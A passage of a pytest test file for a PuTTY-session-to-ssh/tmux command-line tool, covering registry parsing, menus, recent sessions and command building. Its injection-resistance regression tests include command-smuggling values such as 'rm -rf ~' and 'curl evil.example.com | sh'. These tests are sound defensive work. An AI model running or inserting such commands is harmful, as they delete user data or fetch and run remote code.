import contextlib
import io
import shlex
import shutil
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import pytest

import putty
from utils.display_util import (
    generate_menu_items, make_display_pair, separator, separator_term,
)
from utils.ppk_convert_util import convert_ppk_to_openssh
from utils.putty_parse_util import parse_putty_reg
from utils.recent_sessions_util import (
    load_recent_entries,
    load_recent_sessions,
    update_recent_sessions,
)
from utils.ssh_command_util import build_ssh_command, safe_name
from utils.titlecase_util import smart_title, unquote_display

REG_PATH = Path(__file__).parent / "data" / "sample.reg"
PPK_FIXTURE = Path(__file__).parent / "data" / "test_key.ppk"


class _FakeResult:
    def __init__(self, returncode):
        self.returncode = returncode


def pane_cmd(argv):
    """Extract the ssh command string from a tmux argv list."""
    return next(a for a in argv if a.startswith("ssh"))


def ssh_tokens(argv):
    """Split the tmux pane command back into ssh argv tokens."""
    return shlex.split(pane_cmd(argv))

REG_HEADER = '[HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\'


def write_reg(tmp_path: Path, content: str, encoding: str = "utf-8-sig") -> Path:
    p = tmp_path / "sessions.reg"
    p.write_text(content, encoding=encoding)
    return p


def mini_session(name: str, host: str, **overrides) -> str:
    lines = [f"{REG_HEADER}{name}]", f'"HostName"="{host}"']
    for k, v in overrides.items():
        lines.append(f'"{k}"="{v}"')
    return "\n".join(lines) + "\n"


# ── Parser: happy paths ──────────────────────────────────────────────────────

class TestParsePuttyReg:
    def test_parses_utf16le(self, tmp_path):
        p = write_reg(tmp_path, mini_session("dev", "dev.example.com"), "utf-16-le")
        sessions = parse_putty_reg(p)
        assert sessions["dev"]["HostName"] == "dev.example.com"

    def test_parses_utf16le_without_bom(self, tmp_path):
        p = write_reg(tmp_path, mini_session("dev", "dev.example.com"), "utf-16-le")
        raw = p.read_bytes()
        assert not raw.startswith(b"\xff\xfe")  # sanity: no BOM
        sessions = parse_putty_reg(p)
        assert sessions["dev"]["HostName"] == "dev.example.com"

    def test_parses_utf16be(self, tmp_path):
        p = write_reg(tmp_path, mini_session("dev", "dev.example.com"), "utf-16-be")
        sessions = parse_putty_reg(p)
        assert sessions["dev"]["HostName"] == "dev.example.com"

    def test_parses_utf8_with_bom(self, tmp_path):
        p = write_reg(tmp_path, mini_session("dev", "dev.example.com"), "utf-8-sig")
        sessions = parse_putty_reg(p)
        assert sessions["dev"]["HostName"] == "dev.example.com"

    def test_parses_plain_utf8(self, tmp_path):
        p = write_reg(tmp_path, mini_session("dev", "dev.example.com"), "utf-8")
        sessions = parse_putty_reg(p)
        assert sessions["dev"]["HostName"] == "dev.example.com"

    def test_sample_file_sessions(self):
        sessions = parse_putty_reg(REG_PATH)
        assert set(sessions) == {
            "prod-web-1", "prod-db", "xxx-archived", "broken",
            "Foo%20Bar", "jumphost-session", "socks-session",
            "with-key", "with-remote-cmd",
        }

    def test_dword_port_decoded(self):
        sessions = parse_putty_reg(REG_PATH)
        assert sessions["prod-web-1"]["PortNumber"] == "22"  # 0x16

    def test_backslash_unescape_in_strings(self):
        sessions = parse_putty_reg(REG_PATH)
        assert "C:\\Users\\hiiam\\keys\\id_rsa.ppk" == \
            sessions["with-key"]["PublicKeyFile"]

    def test_missing_file_raises(self, tmp_path):
        from utils.putty_parse_util import parse_putty_reg as ppr
        with pytest.raises(FileNotFoundError):
            ppr(tmp_path / "nope.reg")

    def test_garbage_file_no_sessions(self, tmp_path):
        p = tmp_path / "garbage.reg"
        p.write_text("this is not a registry file\n", encoding="utf-8")
        assert parse_putty_reg(p) == {}

    def test_value_after_new_session_header(self, tmp_path):
        content = f"""{REG_HEADER}a]
"HostName"="a.example.com"

{REG_HEADER}b]
"HostName"="b.example.com"
"""
        sessions = parse_putty_reg(write_reg(tmp_path, content, "utf-8"))
        assert sessions["a"]["HostName"] == "a.example.com"
        assert sessions["b"]["HostName"] == "b.example.com"

    def test_bad_dword_defaults_to_zero(self, tmp_path):
        content = f'{REG_HEADER}dwordbad]\n"PortNumber"=dword:zzzz\n'
        sessions = parse_putty_reg(write_reg(tmp_path, content, "utf-8"))
        assert sessions["dwordbad"]["PortNumber"] == "0"

    def test_other_value_types_passthrough(self, tmp_path):
        # hex: and hex(b): style reg values land in the passthrough branch
        content = (
            f'{REG_HEADER}weird]\n'
            '"TerminalType"=hex:00,01\n'
            '"Weird"=hex(b):00,00,00,00,00,00,00,00\n'
            '"Note"=no quotes here\n'
        )
        sessions = parse_putty_reg(write_reg(tmp_path, content, "utf-8"))
        assert sessions["weird"]["TerminalType"] == "hex:00,01"
        assert sessions["weird"]["Weird"] == "hex(b):00,00,00,00,00,00,00,00"
        assert sessions["weird"]["Note"] == "no quotes here"

    def test_bom_less_utf16be(self, tmp_path):
        # \x00[ prefix is the utf-16be signature without BOM (line 17 branch)
        p = tmp_path / "reg.reg"
        p.write_text(mini_session("be", "be.example.com"), encoding="utf-16-be")
        assert parse_putty_reg(p)["be"]["HostName"] == "be.example.com"

    def test_utf16le_with_bom(self, tmp_path):
        p = tmp_path / "reg.reg"
        raw = mini_session("bom", "bom.example.com").encode("utf-16-le")
        p.write_bytes(b"\xff\xfe" + raw)
        assert parse_putty_reg(p)["bom"]["HostName"] == "bom.example.com"

    def test_utf16be_with_bom(self, tmp_path):
        p = tmp_path / "reg.reg"
        raw = mini_session("bebom", "bebom.example.com").encode("utf-16-be")
        p.write_bytes(b"\xfe\xff" + raw)
        assert parse_putty_reg(p)["bebom"]["HostName"] == "bebom.example.com"


# ── Display ──────────────────────────────────────────────────────────────────

class TestDisplay:
    def test_display_pair_basic(self):
        sort_key, display, name = make_display_pair("prod-web-1", {
            "HostName": "web1.example.com", "PortNumber": "2222", "UserName": "deploy",
        })
        assert name == "prod-web-1"
        assert display.lower() == sort_key
        assert "Prod-Web-1" in display
        assert "deploy@web1.example.com:2222" in display

    def test_default_port_omitted(self):
        _, display, _ = make_display_pair("d", {"HostName": "h.example.com"})
        assert ":22" not in display

    def test_hints(self):
        _, display, _ = make_display_pair("k", {
            "HostName": "h", "PublicKeyFile": "x.ppk",
            "ProxyMethod": "6", "ProxyHost": "j",
            "RemoteCommand": "htop",
        })
        assert "🔑" in display and "🔀" in display and "⚡" in display


class TestMenuItems:
    def test_recents_first_then_separator_then_sorted(self):
        sessions = {
            "b": {"HostName": "b"}, "a": {"HostName": "a"},
            "r": {"HostName": "r"},
        }
        items = list(generate_menu_items(sessions, ["r"]))
        displays = [d for d, _ in items]
        assert any("RECENT" in d for d in displays)
        names = [n for _, n in items if n is not None]
        assert names == ["r", "a", "b"]
        # separator right before the sorted block
        sep_idx = next(i for i, (d, n) in enumerate(items) if n is None
                       and "RECENT" not in d)
        assert items[sep_idx + 1][1] == "a"

    def test_stale_recents_skipped(self):
        sessions = {"a": {"HostName": "a"}}
        items = list(generate_menu_items(sessions, ["ghost", "a"]))
        names = [n for _, n in items if n is not None]
        assert names == ["a"]

    def test_no_recents_no_header(self):
        items = list(generate_menu_items({"a": {"HostName": "a"}}, []))
        assert all(n is not None for _, n in items)

    def test_separator_not_when_all_recent(self):
        sessions = {"a": {"HostName": "a"}}
        items = list(generate_menu_items(sessions, ["a"]))
        displays = [d for d, _ in items]
        plain_sep = [d for d in displays if d.startswith("──") and "RECENT" not in d]
        assert not plain_sep


# ── Recents ──────────────────────────────────────────────────────────────────

class TestRecents:
    def test_load_filters_to_usable(self, tmp_path):
        f = tmp_path / "recent.txt"
        f.write_text("ghost\nreal\n", encoding="utf-8")
        assert load_recent_sessions(f, {"real": {}}) == ["real"]

    def test_load_dedupes(self, tmp_path):
        f = tmp_path / "recent.txt"
        f.write_text("a\na\nb\na\n", encoding="utf-8")
        assert load_recent_sessions(f, {"a": {}, "b": {}}) == ["a", "b"]

    def test_load_max(self, tmp_path):
        f = tmp_path / "recent.txt"
        f.write_text("\n".join(str(i) for i in range(10)), encoding="utf-8")
        assert len(load_recent_sessions(f, {str(i): {} for i in range(10)})) == 5

    def test_update_prepends_and_keeps_20(self, tmp_path):
        f = tmp_path / "recent.txt"
        f.write_text("\n".join(f"s{i}" for i in range(25)), encoding="utf-8")
        update_recent_sessions(f, "new")
        entries = load_recent_entries(f)
        assert list(entries)[0] == "new"
        assert len(entries) == 20
        assert "s25" not in entries

    def test_update_dedupes_selected(self, tmp_path):
        f = tmp_path / "recent.txt"
        f.write_text("a\nb\nc\n", encoding="utf-8")
        update_recent_sessions(f, "b")
        entries = load_recent_entries(f)
        assert list(entries) == ["b", "a", "c"]
        assert entries["b"]["ts"] is not None

    def test_legacy_plain_format_still_loads(self, tmp_path):
        f = tmp_path / "recent.txt"
        f.write_text("a\nb\n", encoding="utf-8")
        assert load_recent_sessions(f, {"a": {}, "b": {}}) == ["a", "b"]

    def test_record_with_exit_code(self, tmp_path):
        f = tmp_path / "recent.txt"
        update_recent_sessions(f, "hA", exit_code=255)
        entries = load_recent_entries(f)
        assert entries["hA"]["exit"] == 255
        assert entries["hA"]["ts"] is not None

    def test_record_on_failed_ssh_exit(self, monkeypatch, tmp_path):
        """Fix 8: ssh exit 255 (conn refused) must still record the session."""
        f = tmp_path / "recent.txt"
        monkeypatch.setattr("subprocess.run", lambda *a, **k: _FakeResult(255))
        update_recent_sessions(f, "hostA", exit_code=255)
        entries = load_recent_entries(f)
        assert entries["hostA"]["exit"] == 255

    def test_no_record_on_launch_failure(self, monkeypatch, tmp_path, capsys):
        """tmux missing -> FileNotFoundError -> no recent entry."""
        f = tmp_path / "recent.txt"

        def fake_run(*a, **k):
            raise FileNotFoundError("tmux")

        import subprocess as sp
        monkeypatch.setattr(sp, "run", fake_run)

        # Simulate the main() code path around subprocess.run
        try:
            sp.run(["tmux"], check=False)
            update_recent_sessions(f, "hostB")
        except FileNotFoundError:
            pass
        assert not f.exists() or f.read_text() == ""


# ── Titlecase ────────────────────────────────────────────────────────────────

class TestTitlecase:
    def test_smart_title_boundaries(self):
        assert smart_title("dev-prod_web.host 2b") == "Dev-Prod_Web.Host 2b"

    def test_unquote_display(self):
        assert unquote_display("Foo%20Bar") == "Foo Bar"
        assert unquote_display("a%2Fb%5Cc%3Ad") == "a/b\\c:d"

    def test_unquote_no_passthrough(self):
        assert unquote_display("Plain-Name_1.0") == "Plain-Name_1.0"


# ── .env loader ──────────────────────────────────────────────────────────────

class TestDotenv:
    def test_parse_basic(self):
        from utils.env_util import _parse_env_file
        parsed = _parse_env_file(
            "A=1\n# comment\n\nexport B=2\nC=\"quoted value\"\nD='sq'\nE=\nF=part\n"
        )
        assert parsed == {
            "A": "1", "B": "2", "C": "quoted value",
            "D": "sq", "E": "", "F": "part",
        }

    def test_real_env_wins(self, monkeypatch, tmp_path):
        from utils import env_util
        f = tmp_path / ".env"
        f.write_text("PUTTY_TEST_VAR=from_file\n", encoding="utf-8")
        monkeypatch.setenv("PUTTY_TEST_VAR", "from_env")
        monkeypatch.setattr(env_util, "_find_env_file", lambda: f)
        env_util.load_dotenv()
        import os
        assert os.environ["PUTTY_TEST_VAR"] == "from_env"

    def test_loads_from_file(self, monkeypatch, tmp_path):
        import os

        from utils import env_util
        f = tmp_path / ".env"
        f.write_text("PUTTY_TEST_VAR2=from_file\n", encoding="utf-8")
        monkeypatch.delenv("PUTTY_TEST_VAR2", raising=False)
        monkeypatch.setattr(env_util, "_find_env_file", lambda: f)
        path = env_util.load_dotenv()
        assert path == f
        assert os.environ["PUTTY_TEST_VAR2"] == "from_file"

    def test_no_env_file_anywhere(self, monkeypatch):
        from utils import env_util
        monkeypatch.setattr(env_util, "_find_env_file", lambda: None)
        assert env_util.load_dotenv() is None

    def test_unreadable_env_file(self, monkeypatch, tmp_path):
        from utils import env_util
        f = tmp_path / ".env"
        f.write_text("SHOULD_NOT_LOAD=1\n", encoding="utf-8")
        monkeypatch.setattr(
            type(f), "read_text",
            lambda self, *a, **k: (_ for _ in ()).throw(OSError("denied")),
        )
        monkeypatch.setattr(env_util, "_find_env_file", lambda: f)
        assert env_util.load_dotenv() is None

    def test_parse_skips_malformed_lines(self):
        from utils.env_util import _parse_env_file
        # lines without '=' are skipped (line 18) via the no-equals branch
        assert _parse_env_file("NOEQUALS\nA=1\n") == {"A": "1"}

    def test_parse_skips_blank_and_comment_only(self):
        from utils.env_util import _parse_env_file
        assert _parse_env_file("") == {}
        assert _parse_env_file("# only comment\n\n") == {}

    def test_repo_root_and_home_candidates(self, monkeypatch, tmp_path):
        """_find_env_file checks repo root of env_util, then ~/.putty-cli."""
        from utils import env_util
        # env_util lives in <repo>/utils/, so its parent is the repo root
        repo_root = Path(env_util.__file__).resolve().parent.parent
        monkeypatch.setattr(
            env_util.Path, "is_file",
            lambda p: str(p).endswith("/.env"),
        )
        found = env_util._find_env_file()
        assert found == repo_root / ".env" or found == env_util.Path.home() / ".putty-cli" / ".env"

    def test_find_env_file_none_when_missing(self, monkeypatch, tmp_path):
        from utils import env_util
        monkeypatch.setattr(env_util.Path, "is_file", lambda p: False)
        assert env_util._find_env_file() is None


# ── Recents coverage gaps ────────────────────────────────────────────────────

class TestRecentsEdgeCases:
    def test_wrapper_script_is_executable_and_targets_repo(self):
        """bin/putty-cli: executable, resolves repo dir from its own path."""
        wrapper = Path(__file__).resolve().parent.parent / "bin" / "putty-cli"
        import os
        assert os.access(wrapper, os.X_OK)
        content = wrapper.read_text()
        assert "exec" in content
        assert "venv" in content


# ── CLI (item 23) ────────────────────────────────────────────────────────────

class TestCli:
    def _run(self, *args, env_reg="tests/data/sample.reg", expect_stdout=None, expect_stderr=None):
        import contextlib
        import io
        import os
        old = os.environ.get("PUTTY_REG_PATH")
        if env_reg:
            os.environ["PUTTY_REG_PATH"] = env_reg
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = putty.main(list(args))
        if old is not None:
            os.environ["PUTTY_REG_PATH"] = old
        s_out, s_err = out.getvalue(), err.getvalue()
        if expect_stdout:
            assert expect_stdout in s_out, f"stdout missing {expect_stdout!r}: {s_out!r}"
        if expect_stderr:
            assert expect_stderr in s_err, f"stderr missing {expect_stderr!r}: {s_err!r}"
        return rc

    def test_list_prints_sorted_names(self):
        rc = self._run("--list")
        assert rc == 0

    def test_list_excludes_archived(self, capsys):
        import os
        old = os.environ.get("PUTTY_REG_PATH")
        os.environ["PUTTY_REG_PATH"] = "tests/data/sample.reg"
        with contextlib.redirect_stdout(io.StringIO()) as buf:
            putty.main(["--list"])
        if old is not None:
            os.environ["PUTTY_REG_PATH"] = old
        assert "xxx-archived" not in buf.getvalue()
        assert "prod-web-1" in buf.getvalue()

    def test_connect_dry_run(self):
        rc = self._run(
            "--connect", "prod-web-1", "--dry-run", "--no-record",
            expect_stdout="prod-web-1",
        )
        assert rc == 0

    def test_connect_unknown_session(self):
        rc = self._run("--connect", "definitely-not-here", expect_stderr="no session named")
        assert rc == 1

    def test_connect_dry_run_does_not_record(self, tmp_path, monkeypatch):
        import contextlib
        import io
        monkeypatch.setenv("PUTTY_REG_PATH", "tests/data/sample.reg")
        recent = tmp_path / "recent.txt"
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        with contextlib.redirect_stdout(io.StringIO()):
            rc = putty.main(["--connect", "prod-db", "--dry-run"])
        assert rc == 0
        assert not recent.exists()

    def test_no_reg_path_exits_cleanly(self, monkeypatch):
        import contextlib
        import io
        monkeypatch.delenv("PUTTY_REG_PATH", raising=False)
        monkeypatch.setattr("utils.env_util._find_env_file", lambda: None)
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            with pytest.raises(SystemExit) as exc:
                putty.main(["--list"])
        assert exc.value.code == 1
        assert "PUTTY_REG_PATH" in err.getvalue()

    def test_parser_help_lists_modes(self, capsys):
        with pytest.raises(SystemExit) as exc:
            putty.build_parser().parse_args(["--help"])
        assert exc.value.code == 0
        assert "--connect" in capsys.readouterr().out

    def test_archived_sessions_hidden_from_menu(self, capsys):
        import os
        old = os.environ.get("PUTTY_REG_PATH")
        os.environ["PUTTY_REG_PATH"] = "tests/data/sample.reg"
        with contextlib.redirect_stdout(io.StringIO()) as buf:
            putty.main(["--list"])
        if old is not None:
            os.environ["PUTTY_REG_PATH"] = old
        assert "xxx-archived" not in buf.getvalue()


# ── Session actions (item 1) ─────────────────────────────────────────────────

class TestSessionActions:
    def test_ping_reachable(self, monkeypatch):
        # localhost has no ssh, but a bound port answers TCP
        import socket
        srv = socket.socket()
        srv.bind(("127.0.0.1", 0))
        srv.listen(1)
        port = srv.getsockname()[1]
        rc = putty.ping_host("127.0.0.1", str(port))
        srv.close()
        assert rc == 0

    def test_ping_unreachable(self, capsys):
        # RFC 5737 test addr, short timeout
        rc = putty.ping_host("192.0.2.1", "1")
        assert rc == 1
        assert "unreachable" in capsys.readouterr().err

    def test_copy_to_clipboard_osc52(self, capsys):
        # the menu's Copy uses the shared clipboard util
        assert putty.copy_command("ssh foo") is True
        out = capsys.readouterr().out
        assert "\033]52;c;" in out  # OSC52 escape sequence

    def test_handle_action_copy(self, capsys, tmp_path, monkeypatch):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        rc = putty.handle_action(
            putty.ACTION_COPY, "s", {"HostName": "h.example.com"},
            reg_path=tmp_path / "putty.reg", recent_file=tmp_path / "rec",
        )
        assert rc == 0
        assert "Copied" in capsys.readouterr().out

    def test_handle_action_ping(self, tmp_path):
        # unified probe: ICMP first (RFC 5737 addr fails both ICMP+TCP)
        rc = putty.handle_action(
            putty.ACTION_PING, "s", {"HostName": "192.0.2.1", "PortNumber": "1"},
            reg_path=tmp_path / "putty.reg", recent_file=tmp_path / "rec",
        )
        assert rc == 1

    def test_handle_action_connect_invokes_connect(self, tmp_path, monkeypatch, capsys):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        called = {}
        monkeypatch.setattr(putty, "connect_to_session",
                            lambda *a, **k: called.update(k) or 0)
        rc = putty.handle_action(
            putty.ACTION_CONNECT, "s", {"HostName": "h"},
            reg_path=tmp_path / "putty.reg", recent_file=tmp_path / "rec",
            dry_run=False,
        )
        assert rc == 0
        assert called.get("dry_run") is False

    def test_fzf_missing_falls_back(self, monkeypatch, capsys, tmp_path):
        """--fzf with no fzf binary -> note printed, falls back to menu."""
        monkeypatch.setattr(shutil, "which", lambda name: None)
        from putty import pick_session_fzf
        result = pick_session_fzf({"a": {"HostName": "a"}}, tmp_path / "r.reg")
        assert result is None
        assert "fzf not found" in capsys.readouterr().err

    def test_fzf_esc_returns_none(self, monkeypatch, tmp_path):
        """fzf nonzero exit (Esc) -> None."""
        import subprocess as sp

        from putty import pick_session_fzf
        monkeypatch.setattr(shutil, "which", lambda name: "/usr/bin/fzf")
        monkeypatch.setattr(
            sp, "run",
            lambda *a, **k: sp.CompletedProcess(a[0], 130, stdout=""),
        )
        assert pick_session_fzf(
            {"a": {"HostName": "a"}}, tmp_path / "r.reg") is None

    def test_fzf_picks_valid_session(self, monkeypatch, tmp_path):
        import subprocess as sp

        from putty import pick_session_fzf
        monkeypatch.setattr(shutil, "which", lambda name: "/usr/bin/fzf")
        monkeypatch.setattr(
            sp, "run",
            lambda *a, **k: sp.CompletedProcess(a[0], 0, stdout="a\n"),
        )
        assert pick_session_fzf(
            {"a": {"HostName": "a"}}, tmp_path / "r.reg") == "a"

    def test_fzf_filters_invalid_output(self, monkeypatch, tmp_path):
        import subprocess as sp

        from putty import pick_session_fzf
        monkeypatch.setattr(shutil, "which", lambda name: "/usr/bin/fzf")
        monkeypatch.setattr(
            sp, "run",
            lambda *a, **k: sp.CompletedProcess(a[0], 0, stdout="ghost\n"),
        )
        assert pick_session_fzf(
            {"a": {"HostName": "a"}}, tmp_path / "r.reg") is None

    def test_cmdline_fzf_flag_accepted(self):
        """--fzf parses (menu fallback tested via pick functions)."""
        args = putty.build_parser().parse_args(["--fzf", "--list"])
        assert args.fzf is True

    def test_build_ssh_command_no_tmux(self, tmp_path, monkeypatch):
        """tmux=False returns bare ssh argv (no tmux, no log side effects)."""
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        argv, _ = build_ssh_command(
            "s", {"HostName": "h", "UserName": "u", "PortNumber": "2222"},
            reg_path=tmp_path / "putty.reg", tmux=False,
        )
        assert argv[0] == "ssh"
        assert not any("tmux" in str(a) for a in argv)
        assert not (tmp_path / "logs").exists()  # no makedirs side effect


# ── Tag grouping + archived toggle (item 2) ──────────────────────────────────

class TestTagGrouping:
    def test_session_tag_extraction(self):
        from utils.display_util import session_tag
        assert session_tag("prod:web-1") == "prod"
        assert session_tag("Prod:DB") == "prod"
        assert session_tag("no-tag-here") is None
        assert session_tag(":empty-tag") is None
        assert session_tag("Foo%20Bar:baz") == "foo bar"

    def test_grouped_order_with_headers(self):
        sessions = {
            "prod:web-1": {"HostName": "a"},
            "prod:web-2": {"HostName": "b"},
            "staging:web": {"HostName": "c"},
            "solo": {"HostName": "d"},
        }
        items = list(generate_menu_items(sessions, []))
        names = [n for _, n in items if n is not None]
        headers = [d for d, n in items if n is None]
        assert headers == [separator_term("PROD"), separator_term("STAGING"),
                           separator_term("OTHER")]
        assert names == ["prod:web-1", "prod:web-2", "staging:web", "solo"]

    def test_flat_mode_no_tag_headers(self):
        sessions = {
            "prod:web-1": {"HostName": "a"},
            "solo": {"HostName": "d"},
        }
        items = list(generate_menu_items(sessions, [], group_by_tag=False))
        assert all(n is not None for _, n in items)  # no headers at all

    def test_recents_not_grouped(self):
        """Recent sessions stay under the recents header, ungrouped."""
        sessions = {"prod:a": {"HostName": "a"}, "b": {"HostName": "b"}}
        items = list(generate_menu_items(sessions, ["prod:a"]))
        names = [n for _, n in items if n is not None]
        assert names[0] == "prod:a"  # under RECENT, not under PROD header
        headers = [d for d, _ in items if _ is None]
        assert not any("PROD" in d for d in headers[1:])

    def test_archived_toggle(self, capsys, monkeypatch):
        import io
        monkeypatch.setenv("PUTTY_REG_PATH", "tests/data/sample.reg")
        with contextlib.redirect_stdout(io.StringIO()) as buf:
            rc = putty.main(["--list", "--archived"])
        assert rc == 0
        assert "xxx-archived" in buf.getvalue()
    def test_wrapper_script_is_executable_and_targets_repo(self):
        """bin/putty-cli: executable, resolves repo dir from its own path."""
        wrapper = Path(__file__).resolve().parent.parent / "bin" / "putty-cli"
        import os
        assert os.access(wrapper, os.X_OK)
        content = wrapper.read_text()
        assert "exec" in content
        assert "venv" in content
    def test_load_creates_missing_file(self, tmp_path):
        f = tmp_path / "recent.txt"
        assert not f.exists()
        assert load_recent_sessions(f, {"a": {}}) == []
        assert f.exists()

    def test_load_unreadable_file(self, tmp_path):
        f = tmp_path / "recent.txt"
        f.write_bytes(b"\xff\xfe\xff\xfe")  # invalid utf-8
        assert load_recent_sessions(f, {"a": {}}) == []

    def test_update_unwritable_file(self, tmp_path, monkeypatch):
        f = tmp_path / "recent.txt"
        f.write_text("a\n", encoding="utf-8")

        def raise_oserror(self, *a, **k):
            raise OSError("denied")

        monkeypatch.setattr(type(f), "write_text", raise_oserror)
        update_recent_sessions(f, "b")  # must not raise


# ── SSH command building ─────────────────────────────────────────────────────

class TestBuildSshCommand:
    @pytest.fixture(autouse=True)
    def _no_tmux(self, monkeypatch, tmp_path):
        monkeypatch.delenv("TMUX", raising=False)
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))

    def test_missing_hostname(self):
        assert build_ssh_command("x", {"PortNumber": "22"}) == (None, None)

    def test_basic_host_argv(self):
        argv, temp_key = build_ssh_command("s", {"HostName": "h.example.com"})
        assert temp_key is None
        assert argv[0] == "tmux"
        assert "h.example.com" in ssh_tokens(argv)

    def test_user_and_port(self):
        argv, _ = build_ssh_command("s", {
            "HostName": "h.example.com", "UserName": "u", "PortNumber": "2222",
        })
        assert argv[0] == "tmux"
        assert argv[1] == "new-session"
        tokens = ssh_tokens(argv)
        assert "u@h.example.com" in tokens
        assert "-p" in tokens and "2222" in tokens

    def test_jump_proxy(self):
        argv, _ = build_ssh_command("s", {
            "HostName": "t.internal", "ProxyMethod": "6",
            "ProxyHost": "jump.example.com", "ProxyPort": "2222",
            "ProxyUsername": "ju",
        })
        tokens = ssh_tokens(argv)
        assert tokens[tokens.index("-J") + 1] == "ju@jump.example.com:2222"

    def test_socks_proxy_warns_and_is_ignored(self, capsys):
        argv, _ = build_ssh_command("s", {
            "HostName": "via-socks.internal", "ProxyMethod": "3",
            "ProxyHost": "socks.example.com",
        })
        tokens = ssh_tokens(argv)
        assert "-J" not in tokens
        err = capsys.readouterr().err
        assert "Warning" in err and "socks.example.com" in err

    def test_remote_command_argv(self):
        argv, _ = build_ssh_command("s", {
            "HostName": "c.example.com", "RemoteCommand": "htop",
        })
        tokens = ssh_tokens(argv)
        assert "-t" in tokens
        assert tokens[-1] == "htop"

    def test_no_hardcoded_user_paths(self):
        argv, _ = build_ssh_command("s", {"HostName": "h"})
        joined = " ".join(argv)
        assert "/mnt/c/Users" not in joined
        assert "OneDrive" not in joined

    def test_log_dir_from_env(self, monkeypatch, tmp_path):
        logdir = tmp_path / "mylogs"
        monkeypatch.setenv("PUTTY_LOG_DIR", str(logdir))
        argv, _ = build_ssh_command("s", {"HostName": "h.example.com"})
        assert str(logdir) in " ".join(argv)

    def test_log_dir_defaults_to_reg_parent(self, tmp_path, monkeypatch):
        monkeypatch.delenv("PUTTY_LOG_DIR", raising=False)
        reg = tmp_path / "settings" / "putty.reg"
        reg.parent.mkdir(parents=True)
        reg.touch()
        argv, _ = build_ssh_command("s", {"HostName": "h"}, reg_path=reg)
        assert f"{tmp_path}/settings" in " ".join(argv)

    def test_ppk_resolved_relative_to_reg_path(self, tmp_path, monkeypatch, capsys):
        monkeypatch.setenv("PUTTY_LOG_DIR", "/tmp/opencode/putty-test-logs")
        reg = tmp_path / "putty.reg"
        reg.touch()
        keys_dir = tmp_path / "keys"
        keys_dir.mkdir()
        shutil.copy(PPK_FIXTURE, keys_dir / "id.ppk")
        argv, temp_key = build_ssh_command(
            "s",
            {"HostName": "h", "PublicKeyFile": "keys/id.ppk"},
            reg_path=reg,
        )
        out = capsys.readouterr().out
        assert str(keys_dir / "id.ppk") in out
        assert temp_key is not None
        Path(temp_key).unlink(missing_ok=True)
        assert "-i" in ssh_tokens(argv)

    # ── Injection resistance (fix 2 regression tests) ────────────────────────

    def test_evil_session_name_quoted(self, tmp_path, monkeypatch):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        evil = "x'; rm -rf ~; echo '"
        argv, _ = build_ssh_command(evil, {"HostName": "h"})
        # Window name must be the sanitized version (no shell metachars)
        assert argv[argv.index("-n") + 1] == safe_name(evil)
        # ...which contains no quotes/semicolons that could escape tmux parsing
        assert "'" not in argv[argv.index("-n") + 1]
        # ...and no raw injection text survives anywhere in the argv
        assert "rm -rf" not in " ".join(argv)

    def test_evil_hostname_never_executes(self, tmp_path, monkeypatch):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        evil_host = "h'; touch /tmp/pwned-putty; echo '"
        argv, _ = build_ssh_command("s", {"HostName": evil_host})
        # evil host must be one shlex-quoted token inside the pane command
        assert shlex.quote(evil_host) in pane_cmd(argv)
        # splitting the pane cmd back yields the original value
        assert evil_host in ssh_tokens(argv)

    def test_evil_remote_command_is_safe_token(self, tmp_path, monkeypatch):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        evil = "x'; curl evil.example.com | sh; echo '"
        argv, _ = build_ssh_command("s", {
            "HostName": "h", "RemoteCommand": evil,
        })
        assert evil in ssh_tokens(argv)

    def test_tmux_window_vs_session(self, monkeypatch, tmp_path):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        monkeypatch.setenv("TMUX", "/tmp/tmux-0/default,0,0")
        argv, _ = build_ssh_command("s", {"HostName": "h"})
        assert argv[1] == "new-window"
        monkeypatch.delenv("TMUX")
        argv, _ = build_ssh_command("s", {"HostName": "h"})
        assert argv[1] == "new-session"

    def test_pane_cmd_roundtrips(self, tmp_path, monkeypatch):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        argv, _ = build_ssh_command("s", {
            "HostName": "h.example.com", "UserName": "ops",
            "PortNumber": "2222",
        })
        tokens = ssh_tokens(argv)
        assert tokens[0] == "ssh"
        assert "ops@h.example.com" in tokens
        assert "-p" in tokens and "2222" in tokens

    def test_safe_name_sanitizes(self):
        assert safe_name("a/b\\c:d*e?f") == "a_b_c_d_e_f"
        assert safe_name("") == "session"
        assert safe_name("normal-session_1.0") == "normal-session_1.0"


# ── Mosh (item 6) + CommandLineArgs (item 5) ─────────────────────────────────

class TestMoshAndExtraArgs:
    def test_wrap_tmux_attached_launch(self, tmp_path, monkeypatch):
        """Launch is ATTACHED (no -d): tmux blocks until ssh exits, so
        connect_to_session's single subprocess.run is the whole session.
        (Detached + attach-later proved unreliable: tmux 3.2+ reaps an
        unattached destroy-unattached session before attach can run.)"""
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        monkeypatch.delenv("TMUX", raising=False)
        argv, _ = build_ssh_command(
            "s", {"HostName": "h"}, reg_path=tmp_path / "r.reg", tmux=True,
        )
        assert argv[:2] == ["tmux", "new-session"]
        assert "-d" not in argv
        # pipe-pane targets the pane just created (targetless: '-t name'
        # breaks for names containing a dot)
        pp_idx = argv.index("pipe-pane")
        assert "-o" == argv[pp_idx + 1] and argv[pp_idx + 2].startswith("cat >>")
        # and the argv contains NO shell (no 'sh','-c')
        assert "sh" not in argv[:3]

    def test_outside_tmux_names_session_explicitly(self, tmp_path, monkeypatch):
        """Regression: outside tmux, `new-session -n NAME` names only the
